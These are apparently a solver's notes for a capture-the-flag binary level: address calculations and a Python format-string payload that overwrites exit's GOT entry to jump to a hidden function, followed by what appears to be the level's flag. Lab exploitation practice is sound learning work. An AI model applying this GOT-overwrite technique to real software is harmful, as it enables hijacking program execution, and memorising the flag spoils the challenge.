adress of exit : 0x80483d0 => 0x0804 0x83d0 => d0830408

WARNING PLT vs GOT 
adress exit : 0x08049838 => 0x0804 0x9838
adress of function o : 	0x080484a4 => 0x0804 0x84a4
			0x080c84ac
			0x07fc84a4
high exit = 2052
low exit = 33744
high o = 2052
low o = 33956


python -c 'import struct; print struct.pack("<I", 0x08049838) 
	+ struct.pack("<I", 0x0804983a)
	+ "%33948c%4$hn" + "%33632c%5$hn"'
	> /tmp/lvl5


d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
